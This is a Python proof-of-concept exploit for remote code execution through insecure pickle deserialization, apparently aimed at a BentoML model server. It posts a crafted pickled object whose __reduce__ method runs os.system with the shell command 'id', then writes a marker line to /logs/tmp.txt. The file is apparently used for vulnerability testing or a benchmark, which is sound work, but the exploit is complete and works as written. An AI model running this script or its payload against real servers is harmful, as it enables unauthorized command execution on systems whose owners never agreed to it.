import requests
import pickle
import sys

# Check if a hostname argument is passed
if len(sys.argv) < 2:
    print("HOSTNAME not found.")
    sys.exit(1)

# Get the hostname from the command-line argument
hostname = sys.argv[1]

# Set the URL using the passed hostname
url = f"http://{hostname}:3001/"

headers = {
    "args-number": "3",
    "Content-Type": "application/vnd.bentoml.pickled",
}

class SimpleModel:
    def __reduce__(self):
        return  (__import__('os').system, ("id;echo 'EXPLOITED' >> /logs/tmp.txt",))
data = pickle.dumps(SimpleModel())

try:
    # Set a timeout for the POST request (10 seconds)
    response = requests.post(url, headers=headers, data=data, timeout=10)
    print(response.text)
except requests.exceptions.Timeout:
    print("Request timed out. Terminating script.")
except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")
finally:
    exit()

